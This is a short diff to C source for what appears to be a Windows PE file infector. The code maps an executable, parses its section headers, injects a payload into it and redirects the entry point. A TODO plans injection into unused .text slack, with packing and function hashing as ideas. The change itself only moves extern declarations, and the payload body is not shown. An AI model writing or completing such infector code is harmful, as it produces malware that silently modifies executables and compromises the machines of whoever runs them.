@@ -17,7 +17,12 @@ typedef CONST BYTE* PCBYTE;
 // TODO: Inject into end of .text, between virtsize and rawsize (unused space)
 // Ideas: Packing, unpacking, function hashing
 
+EXTERN_C_START
 extern VOID payload();
+extern LONGLONG delta2start;
+extern LONGLONG to_c_code;
+extern ULONGLONG __end_code;
+EXTERN_C_END
 
 VOID InjectPayload(IN CONST PIMAGE_DOS_HEADER pMapAddress, IN CONST PBYTE pPayload,
                    IN CONST DWORD dwPayloadSize) {
@@ -26,8 +31,6 @@ VOID InjectPayload(IN CONST PIMAGE_DOS_HEADER pMapAddress, IN CONST PBYTE pPaylo
     WORD wNbSections;
     PIMAGE_SECTION_HEADER pSection, pLastSection;
     DWORD dwFileAlignment, dwLastSectionPtr, dwLastSectionSize, dwOrigEntryPoint, dwNewEntryPoint;
-
-    extern LONGLONG delta2start;
 
     pDosHeader = (PIMAGE_DOS_HEADER)pMapAddress;
     pNtHeader = (PIMAGE_NT_HEADERS64)((PUCHAR)pDosHeader + pDosHeader->e_lfanew);
@@ -81,9 +84,6 @@ int main(int argc, char* argv[]) {
     LPVOID pMapAddress;
     DWORD dwFileSize, dwPayloadSize;
     ULARGE_INTEGER uliSize, uliOffset;
-
-    extern LONGLONG to_c_code;
-    extern ULONGLONG __end_code;
 
     dwPayloadSize = (DWORD)((PBYTE)&__end_code - (PBYTE)&payload + sizeof(LONGLONG));
     printf("Payload size: %u\n", dwPayloadSize);
